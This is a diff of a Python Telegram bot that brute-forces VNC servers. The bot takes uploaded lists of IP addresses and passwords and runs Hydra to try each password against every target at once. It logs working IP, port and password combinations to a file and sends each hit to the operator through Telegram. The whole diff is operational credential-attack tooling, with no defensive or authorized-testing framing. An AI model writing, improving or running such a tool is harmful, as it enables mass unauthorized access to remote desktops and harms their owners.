@@ -1,9 +1,7 @@
 #!/usr/bin/env python3
 """
-VNC Checker Telegram Bot - File Upload Version
-- Upload files directly via Telegram
-- No GitHub files needed!
-- Sends results immediately via Telegram
+VNC Checker Telegram Bot - PASSWORD-FIRST MODE
+Scans by password (not by IP) for MUCH faster results!
 """
 
 import os
@@ -35,12 +33,15 @@ OUTPUT_FILE = 'valid_vnc.txt'
 # Global state
 scan_status = {
     'running': False,
+    'total_passwords': 0,
     'total_ips': 0,
-    'checked': 0,
+    'checked_combinations': 0,
     'found': 0,
-    'current_ip': '',
+    'current_password': '',
+    'current_pass_idx': 0,
     'start_time': None,
-    'hits': []
+    'hits': [],
+    'found_ips': set()  # Track IPs that already have passwords
 }
 
 files_status = {
@@ -60,18 +61,34 @@ def check_hydra_installed():
     except:
         return False
 
-def check_vnc_with_hydra(ip, port, password_file, threads=4, timeout_sec=300):
-    """Check VNC with Hydra"""
+def check_single_password_all_ips(ips, password, timeout_sec=60):
+    """Check one password against all IPs at once using Hydra"""
     try:
-        print(f"[DEBUG] Checking {ip}:{port}...")
+        # Create temp file with IPs
+        temp_ip_file = '/tmp/target_ips.txt'
+        with open(temp_ip_file, 'w') as f:
+            for ip_string in ips:
+                if ':' in ip_string:
+                    ip, port = ip_string.split(':')
+                else:
+                    ip = ip_string
+                    port = '5900'
+                f.write(f"vnc://{ip}:{port}\n")
+        
+        # Create temp password file
+        temp_pass_file = '/tmp/current_pass.txt'
+        with open(temp_pass_file, 'w') as f:
+            f.write(password + '\n')
+        
+        print(f"[DEBUG] Testing password '{password}' on {len(ips)} IPs...")
         
         cmd = [
             'hydra',
-            '-P', password_file,
-            '-t', str(threads),
-            '-f',
-            '-q',
-            f'vnc://{ip}:{port}'
+            '-M', temp_ip_file,  # Multiple targets
+            '-P', temp_pass_file,  # Single password
+            '-t', '4',
+            '-f',  # Stop on first hit per target
+            'vnc'
         ]
         
         start_time = time.time()
@@ -80,37 +97,54 @@ def check_vnc_with_hydra(ip, port, password_file, threads=4, timeout_sec=300):
             cmd,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
-            timeout=timeout_sec,
+            timeout=timeout_sec * len(ips),  # Timeout scaled by number of IPs
             text=True
         )
         
         elapsed = time.time() - start_time
-        print(f"[DEBUG] {ip}:{port} completed in {elapsed:.1f}s")
+        print(f"[DEBUG] Checked {len(ips)} IPs in {elapsed:.1f}s")
         
         output = result.stdout + result.stderr
         
-        if '[vnc]' in output.lower() and 'password:' in output.lower():
-            for line in output.split('\n'):
-                if '[vnc]' in line and 'password:' in line:
-                    parts = line.split('password:')
-                    if len(parts) > 1:
-                        password = parts[1].strip().split()[0]
-                        print(f"[HIT] {ip}:{port} | Password: {password}")
-                        return True, password
+        # Parse hits
+        hits = []
+        for line in output.split('\n'):
+            if '[vnc]' in line.lower() and 'host:' in line.lower():
+                # Parse: [5900][vnc] host: 10.0.0.1   password: admin
+                try:
+                    parts = line.split('host:')[1].split()
+                    if len(parts) >= 3:
+                        ip = parts[0].strip()
+                        found_pass = line.split('password:')[1].strip() if 'password:' in line else password
+                        
+                        # Extract port from beginning
+                        port = '5900'
+                        if '[' in line and ']' in line:
+                            port_part = line[line.find('[')+1:line.find(']')]
+                            if port_part.isdigit():
+                                port = port_part
+                        
+                        hits.append({
+                            'ip': ip,
+                            'port': port,
+                            'password': found_pass
+                        })
+                        print(f"[HIT] {ip}:{port} | Password: {found_pass}")
+                except Exception as e:
+                    print(f"[ERROR] Parsing hit: {e}")
         
-        return False, None
+        return hits
         
     except subprocess.TimeoutExpired:
-        print(f"[TIMEOUT] {ip}:{port} after {timeout_sec}s")
-        return False, None
+        print(f"[TIMEOUT] Password '{password}' check timed out")
+        return []
     except Exception as e:
-        print(f"[ERROR] {ip}:{port} - {e}")
-        return False, None
+        print(f"[ERROR] Checking password '{password}': {e}")
+        return []
 
 def send_message_sync(context, chat_id, message):
     """Send message synchronously from thread"""
     try:
-        # Create new event loop for this thread
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         
@@ -139,14 +173,8 @@ def send_hit(context, chat_id, ip, port, password):
     )
     send_message_sync(context, chat_id, message)
 
-def run_scan(context, chat_id, max_ips=None):
-    """Run the VNC scan with simple progress updates
-    
-    Args:
-        context: Bot context
-        chat_id: Telegram chat ID
-        max_ips: Maximum IPs to check (None = all, for testing use 10)
-    """
+def run_scan_password_first(context, chat_id, max_passwords=None):
+    """Run VNC scan - PASSWORD FIRST mode (much faster!)"""
     global scan_status
     
     with scan_lock:
@@ -154,138 +182,122 @@ def run_scan(context, chat_id, max_ips=None):
             return
         scan_status['running'] = True
         scan_status['start_time'] = datetime.now()
-        scan_status['checked'] = 0
+        scan_status['checked_combinations'] = 0
         scan_status['found'] = 0
         scan_status['hits'] = []
-    
-    last_update_time = time.time()
+        scan_status['found_ips'] = set()
     
     try:
-        # Send diagnostic message
         send_message_sync(context, chat_id, "🔍 Loading files...")
         
         # Load IPs
         with open(IP_FILE) as f:
-            ips = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-        
-        # Limit IPs if in test mode
-        if max_ips:
-            ips = ips[:max_ips]
-            test_mode_msg = f" (TEST MODE - First {max_ips} IPs)"
-        else:
-            test_mode_msg = ""
+            all_ips = [line.strip() for line in f if line.strip() and not line.startswith('#')]
         
         # Load passwords
         with open(PASS_FILE) as f:
-            pass_count = len([line for line in f if line.strip() and not line.startswith('#')])
+            passwords = [line.strip() for line in f if line.strip() and not line.startswith('#')]
         
-        scan_status['total_ips'] = len(ips)
+        # Limit passwords in test mode
+        if max_passwords:
+            passwords = passwords[:max_passwords]
+            test_msg = f" (TEST - First {max_passwords} passwords)"
+        else:
+            test_msg = ""
         
-        # Send diagnostic message
-        send_message_sync(context, chat_id, f"✅ Loaded {len(ips)} IPs and {pass_count} passwords")
+        scan_status['total_ips'] = len(all_ips)
+        scan_status['total_passwords'] = len(passwords)
         
-        # Check Hydra
+        send_message_sync(context, chat_id, f"✅ Loaded {len(all_ips)} IPs and {len(passwords)} passwords")
+        
         if not check_hydra_installed():
             send_message_sync(context, chat_id, "❌ Hydra not installed!")
             scan_status['running'] = False
             return
         
-        send_message_sync(context, chat_id, "✅ Hydra installed and ready")
+        send_message_sync(context, chat_id, "✅ Hydra ready!")
         
         # Send start message
         start_msg = (
-            f"🚀 <b>Scan Started!{test_mode_msg}</b>\n\n"
-            f"📊 Total IPs: {len(ips)}\n"
-            f"🔐 Passwords: {pass_count}\n"
-            f"⚙️ Threads: 4\n"
-            f"⏱ Timeout: 60s per IP\n"
+            f"🚀 <b>PASSWORD-FIRST SCAN{test_msg}</b>\n\n"
+            f"📊 Total IPs: {len(all_ips)}\n"
+            f"🔐 Passwords to test: {len(passwords)}\n"
+            f"⚡ Mode: Test each password on ALL IPs\n"
             f"⏰ Started: {datetime.now().strftime('%H:%M:%S')}\n\n"
-            f"Progress updates every 10 IPs! 📊"
+            f"<b>This is MUCH faster!</b> 🚀"
         )
         send_message_sync(context, chat_id, start_msg)
         
         # Initialize output file
         with open(OUTPUT_FILE, 'w') as f:
             f.write("="*70 + "\n")
-            f.write("Valid VNC Servers\n")
+            f.write("Valid VNC Servers - Password-First Scan\n")
             f.write(f"Scan started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write("="*70 + "\n\n")
         
-        # Send diagnostic for first IP
-        if ips:
-            first_ip = ips[0]
-            send_message_sync(context, chat_id, f"🔍 Testing first IP: {first_ip}\n⏱ This may take 10-60 seconds...")
-        
-        # Check each IP
-        for idx, ip_string in enumerate(ips, 1):
+        # Test each password on ALL IPs
+        for pass_idx, password in enumerate(passwords, 1):
             if not scan_status['running']:
-                send_message_sync(context, chat_id, "⏹ <b>Scan stopped by user</b>")
+                send_message_sync(context, chat_id, "⏹ Scan stopped!")
                 break
             
-            # Parse IP:PORT
-            if ':' in ip_string:
-                ip, port = ip_string.split(':')
-                port = int(port)
-            else:
-                ip = ip_string
-                port = 5900
+            scan_status['current_password'] = password
+            scan_status['current_pass_idx'] = pass_idx
             
-            scan_status['current_ip'] = f"{ip}:{port}"
+            # Show which password we're testing
+            pass_display = password if password else "(empty/no password)"
+            send_message_sync(
+                context, 
+                chat_id,
+                f"🔑 Testing password {pass_idx}/{len(passwords)}: <code>{pass_display}</code>\n"
+                f"📊 Checking against {len(all_ips)} IPs..."
+            )
             
-            # Send status for first few IPs
-            if idx <= 3:
-                send_message_sync(context, chat_id, f"🔍 Checking IP {idx}/{len(ips)}: {ip}:{port}")
+            # Get IPs that don't have passwords yet
+            remaining_ips = [ip for ip in all_ips if ip not in scan_status['found_ips']]
             
-            # Check VNC
-            check_start = time.time()
-            success, result = check_vnc_with_hydra(ip, port, PASS_FILE, 4, timeout_sec=60)
-            check_duration = time.time() - check_start
+            if not remaining_ips:
+                send_message_sync(context, chat_id, "✅ All IPs have passwords found!")
+                break
             
-            # Send diagnostic for first few IPs
-            if idx <= 3:
-                if success:
-                    send_message_sync(context, chat_id, f"✅ IP {idx} done in {check_duration:.1f}s - HIT FOUND! 🎯")
-                else:
-                    send_message_sync(context, chat_id, f"✅ IP {idx} done in {check_duration:.1f}s - No match")
+            # Check this password on all remaining IPs
+            hits = check_single_password_all_ips(remaining_ips, password, timeout_sec=60)
             
-            if success:
+            # Process hits
+            for hit in hits:
                 scan_status['found'] += 1
-                scan_status['hits'].append({
-                    'ip': ip,
-                    'port': port,
-                    'password': result,
-                    'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                })
+                scan_status['hits'].append(hit)
+                scan_status['found_ips'].add(f"{hit['ip']}:{hit['port']}")
                 
                 # Save to file
                 with open(OUTPUT_FILE, 'a') as f:
-                    f.write(f"{ip}:{port} | Password: {result} | Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write(f"{hit['ip']}:{hit['port']} | Password: {hit['password']} | Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                     f.flush()
                 
-                # Send immediate notification
-                send_hit(context, chat_id, ip, port, result)
+                # Send notification
+                send_hit(context, chat_id, hit['ip'], hit['port'], hit['password'])
             
-            scan_status['checked'] = idx
+            scan_status['checked_combinations'] += len(remaining_ips)
             
-            # Send progress update every 10 IPs
-            if idx % 10 == 0 or idx == len(ips):
-                progress = (idx / len(ips)) * 100
+            # Progress update
+            if pass_idx % 5 == 0 or pass_idx == len(passwords) or len(hits) > 0:
+                progress = (pass_idx / len(passwords)) * 100
                 elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
                 
-                if idx > 0:
-                    eta_total = (elapsed / idx) * len(ips)
+                if pass_idx > 0:
+                    eta_total = (elapsed / pass_idx) * len(passwords)
                     eta_remaining = eta_total - elapsed
                     eta_str = f"{eta_remaining/60:.1f} min"
                 else:
                     eta_str = "Calculating..."
                 
                 progress_msg = (
-                    f"📊 <b>PROGRESS UPDATE</b>\n\n"
-                    f"✅ Checked: {idx}/{len(ips)} ({progress:.1f}%)\n"
-                    f"🎯 Hits Found: {scan_status['found']}\n"
+                    f"📊 <b>PROGRESS</b>\n\n"
+                    f"🔐 Passwords tested: {pass_idx}/{len(passwords)} ({progress:.1f}%)\n"
+                    f"📊 Combinations checked: {scan_status['checked_combinations']}\n"
+                    f"🎯 Hits found: {scan_status['found']}\n"
                     f"⏱ Elapsed: {elapsed/60:.1f} min\n"
-                    f"⏳ ETA: {eta_str}\n"
-                    f"🔄 Last: {ip}:{port}"
+                    f"⏳ ETA: {eta_str}"
                 )
                 
                 send_message_sync(context, chat_id, progress_msg)
@@ -295,7 +307,8 @@ def run_scan(context, chat_id, max_ips=None):
         
         summary = (
             f"✅ <b>Scan Complete!</b>\n\n"
-            f"📊 Total checked: {scan_status['checked']}/{scan_status['total_ips']}\n"
+            f"🔐 Passwords tested: {scan_status['current_pass_idx']}/{scan_status['total_passwords']}\n"
+            f"📊 IPs tested: {scan_status['total_ips']}\n"
             f"🎯 Valid found: {scan_status['found']}\n"
             f"⏱ Total time: {elapsed/60:.1f} min\n"
             f"💾 Results: {OUTPUT_FILE}"
@@ -326,13 +339,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     welcome_msg = (
-        "🤖 <b>VNC Checker Bot</b>\n\n"
-        "Welcome! Let's get started.\n\n"
-        "<b>Step 1:</b> Upload your IPs file\n"
-        "• Format: IP:PORT (one per line)\n"
-        "• Example: 10.0.0.1:5900\n\n"
-        "<b>Step 2:</b> Upload your passwords file\n"
-        "• One password per line\n\n"
+        "🤖 <b>VNC Checker Bot - PASSWORD FIRST</b>\n\n"
+        "⚡ <b>NEW: Much faster scanning!</b>\n"
+        "Tests each password on ALL IPs at once!\n\n"
+        "<b>Step 1:</b> Upload IPs file (IP:PORT format)\n"
+        "<b>Step 2:</b> Upload passwords file\n"
         "<b>Step 3:</b> Start scanning!\n\n"
     )
     
@@ -350,7 +361,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("📊 Status", callback_data='status')],
         [InlineKeyboardButton("🚀 Start Scan", callback_data='start_scan')],
-        [InlineKeyboardButton("🧪 Test (First 10 IPs)", callback_data='test_scan')],
+        [InlineKeyboardButton("🧪 Test (5 passwords)", callback_data='test_scan')],
         [InlineKeyboardButton("⏹ Stop Scan", callback_data='stop_scan')],
         [InlineKeyboardButton("📥 Get Results", callback_data='get_results')],
         [InlineKeyboardButton("🗑 Clear Files", callback_data='clear_files')]
@@ -370,12 +381,10 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Download file
     file = await context.bot.get_file(document.file_id)
     
-    # Determine file type based on name or let user specify
+    # Determine file type
     if 'ip' in file_name or file_name == 'ips.txt':
-        # IPs file
         await file.download_to_drive(IP_FILE)
         
-        # Count IPs
         with open(IP_FILE) as f:
             ip_count = len([line for line in f if line.strip() and not line.startswith('#')])
         
@@ -383,18 +392,15 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         files_status['ips_count'] = ip_count
         
         await update.message.reply_text(
-            f"✅ <b>IPs file uploaded!</b>\n\n"
+            f"✅ <b>IPs uploaded!</b>\n\n"
             f"📊 Found {ip_count} IPs\n\n"
-            f"{'✅' if files_status['passwords_uploaded'] else '⏳'} Next: Upload passwords file\n"
-            f"(Name it 'passwords.txt' or include 'pass' in filename)",
+            f"{'✅' if files_status['passwords_uploaded'] else '⏳'} Next: Upload passwords file",
             parse_mode='HTML'
         )
         
     elif 'pass' in file_name or file_name == 'passwords.txt':
-        # Passwords file
         await file.download_to_drive(PASS_FILE)
         
-        # Count passwords
         with open(PASS_FILE) as f:
             pass_count = len([line for line in f if line.strip() and not line.startswith('#')])
         
@@ -402,15 +408,13 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         files_status['passwords_count'] = pass_count
         
         await update.message.reply_text(
-            f"✅ <b>Passwords file uploaded!</b>\n\n"
+            f"✅ <b>Passwords uploaded!</b>\n\n"
             f"🔐 Found {pass_count} passwords\n\n"
-            f"{'✅' if files_status['ips_uploaded'] else '⏳'} Next: Upload IPs file\n"
-            f"(Name it 'ips.txt' or include 'ip' in filename)",
+            f"{'✅' if files_status['ips_uploaded'] else '⏳'} Next: Upload IPs file",
             parse_mode='HTML'
         )
     
     else:
-        # Ask user what file type this is
         keyboard = [
             [InlineKeyboardButton("📋 IPs File", callback_data=f'filetype_ips_{document.file_id}')],
             [InlineKeyboardButton("🔐 Passwords File", callback_data=f'filetype_pass_{document.file_id}')]
@@ -432,7 +436,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🎉 <b>All files uploaded!</b>\n\n"
             f"📊 IPs: {files_status['ips_count']}\n"
             f"🔐 Passwords: {files_status['passwords_count']}\n\n"
-            f"Ready to start scanning!",
+            f"⚡ PASSWORD-FIRST MODE: Much faster!",
             reply_markup=reply_markup,
             parse_mode='HTML'
         )
@@ -460,47 +464,35 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 ip_count = len([line for line in f if line.strip() and not line.startswith('#')])
             files_status['ips_uploaded'] = True
             files_status['ips_count'] = ip_count
-            await query.edit_message_text(
-                f"✅ <b>Saved as IPs file!</b>\n\n"
-                f"📊 Found {ip_count} IPs",
-                parse_mode='HTML'
-            )
+            await query.edit_message_text(f"✅ Saved as IPs file! ({ip_count} IPs)", parse_mode='HTML')
         else:
             await file.download_to_drive(PASS_FILE)
             with open(PASS_FILE) as f:
                 pass_count = len([line for line in f if line.strip() and not line.startswith('#')])
             files_status['passwords_uploaded'] = True
             files_status['passwords_count'] = pass_count
-            await query.edit_message_text(
-                f"✅ <b>Saved as Passwords file!</b>\n\n"
-                f"🔐 Found {pass_count} passwords",
-                parse_mode='HTML'
-            )
+            await query.edit_message_text(f"✅ Saved as Passwords file! ({pass_count} passwords)", parse_mode='HTML')
         return
     
     if query.data == 'status':
         if scan_status['running']:
-            progress = (scan_status['checked'] / scan_status['total_ips'] * 100) if scan_status['total_ips'] > 0 else 0
+            progress = (scan_status['current_pass_idx'] / scan_status['total_passwords'] * 100) if scan_status['total_passwords'] > 0 else 0
             elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
             
             message = (
                 f"📊 <b>Scan Status: RUNNING ✅</b>\n\n"
-                f"✅ Checked: {scan_status['checked']}/{scan_status['total_ips']} ({progress:.1f}%)\n"
+                f"🔐 Password: {scan_status['current_pass_idx']}/{scan_status['total_passwords']} ({progress:.1f}%)\n"
+                f"📊 Combinations: {scan_status['checked_combinations']}\n"
                 f"🎯 Found: {scan_status['found']}\n"
-                f"⏱ Elapsed: {elapsed/60:.1f} min\n"
-                f"🔄 Current: {scan_status['current_ip']}"
+                f"⏱ Elapsed: {elapsed/60:.1f} min"
             )
         else:
             message = (
                 f"📊 <b>Scan Status: IDLE</b>\n\n"
-                f"Files uploaded:\n"
+                f"Files:\n"
                 f"{'✅' if files_status['ips_uploaded'] else '❌'} IPs: {files_status['ips_count']}\n"
-                f"{'✅' if files_status['passwords_uploaded'] else '❌'} Passwords: {files_status['passwords_count']}\n\n"
+                f"{'✅' if files_status['passwords_uploaded'] else '❌'} Passwords: {files_status['passwords_count']}"
             )
-            if files_status['ips_uploaded'] and files_status['passwords_uploaded']:
-                message += "Ready to scan! Tap 'Start Scan'"
-            else:
-                message += "Upload files to begin"
         
         await query.edit_message_text(message, parse_mode='HTML')
     
@@ -509,25 +501,21 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text("⚠️ Scan already running!")
             return
         
-        if not files_status['ips_uploaded']:
-            await query.edit_message_text("❌ Please upload IPs file first!")
+        if not files_status['ips_uploaded'] or not files_status['passwords_uploaded']:
+            await query.edit_message_text("❌ Please upload both files first!")
             return
         
-        if not files_status['passwords_uploaded']:
-            await query.edit_message_text("❌ Please upload passwords file first!")
-            return
-        
-        # Start scan
         thread = threading.Thread(
-            target=run_scan,
+            target=run_scan_password_first,
             args=(context, query.from_user.id)
         )
         thread.daemon = True
         thread.start()
         
         await query.edit_message_text(
-            "🚀 <b>Scan started!</b>\n\n"
-            "You'll receive live updates every 3 seconds! 📊",
+            "🚀 <b>PASSWORD-FIRST Scan started!</b>\n\n"
+            "⚡ Testing each password on ALL IPs!\n"
+            "Much faster than IP-first mode! 🎯",
             parse_mode='HTML'
         )
     
@@ -536,26 +524,20 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text("⚠️ Scan already running!")
             return
         
-        if not files_status['ips_uploaded']:
-            await query.edit_message_text("❌ Please upload IPs file first!")
+        if not files_status['ips_uploaded'] or not files_status['passwords_uploaded']:
+            await query.edit_message_text("❌ Please upload both files first!")
             return
         
-        if not files_status['passwords_uploaded']:
-            await query.edit_message_text("❌ Please upload passwords file first!")
-            return
-        
-        # Test scan (first 10 IPs only)
         thread = threading.Thread(
-            target=run_scan,
-            args=(context, query.from_user.id, 10)  # Test mode: only 10 IPs
+            target=run_scan_password_first,
+            args=(context, query.from_user.id, 5)  # Test first 5 passwords only
         )
         thread.daemon = True
         thread.start()
         
         await query.edit_message_text(
             "🧪 <b>Test scan started!</b>\n\n"
-            "Testing first 10 IPs only...\n"
-            "This will help verify if scanning works!",
+            "Testing first 5 passwords on ALL IPs!",
             parse_mode='HTML'
         )
     
@@ -576,7 +558,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     filename=OUTPUT_FILE,
                     caption=f'📥 VNC Results | 🎯 Found: {scan_status["found"]} credentials'
                 )
-                await query.edit_message_text("✅ Results file sent!")
+                await query.edit_message_text("✅ Results sent!")
             except Exception as e:
                 await query.edit_message_text(f"❌ Error: {e}")
         else:
@@ -588,16 +570,11 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         files_status['ips_count'] = 0
         files_status['passwords_count'] = 0
         
-        # Delete files
         for f in [IP_FILE, PASS_FILE, OUTPUT_FILE]:
             if Path(f).exists():
                 Path(f).unlink()
         
-        await query.edit_message_text(
-            "🗑 <b>Files cleared!</b>\n\n"
-            "Upload new files to start fresh.",
-            parse_mode='HTML'
-        )
+        await query.edit_message_text("🗑 Files cleared!", parse_mode='HTML')
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Status command"""
@@ -605,24 +582,24 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     if scan_status['running']:
-        progress = (scan_status['checked'] / scan_status['total_ips'] * 100) if scan_status['total_ips'] > 0 else 0
+        progress = (scan_status['current_pass_idx'] / scan_status['total_passwords'] * 100) if scan_status['total_passwords'] > 0 else 0
         elapsed = (datetime.now() - scan_status['start_time']).total_seconds()
         
         message = (
             f"📊 <b>Scan Status</b>\n\n"
-            f"✅ Checked: {scan_status['checked']}/{scan_status['total_ips']} ({progress:.1f}%)\n"
+            f"🔐 Password: {scan_status['current_pass_idx']}/{scan_status['total_passwords']} ({progress:.1f}%)\n"
             f"🎯 Found: {scan_status['found']}\n"
             f"⏱ Elapsed: {elapsed/60:.1f} min"
         )
     else:
-        message = "⏸ No scan running. Upload files and /start!"
+        message = "⏸ No scan running."
     
     await update.message.reply_text(message, parse_mode='HTML')
 
 def main():
     """Start the bot"""
     print("="*60)
-    print("VNC Checker Bot - File Upload Version")
+    print("VNC Checker Bot - PASSWORD-FIRST MODE")
     print("="*60)
     
     if not TELEGRAM_BOT_TOKEN:
@@ -647,7 +624,7 @@ def main():
     application.add_handler(CallbackQueryHandler(button_callback))
     
     # Start bot
-    print("✅ Bot started! Waiting for file uploads...")
+    print("✅ Bot started! PASSWORD-FIRST mode enabled!")
     print("="*60)
     
     application.run_polling(allowed_updates=Update.ALL_TYPES)
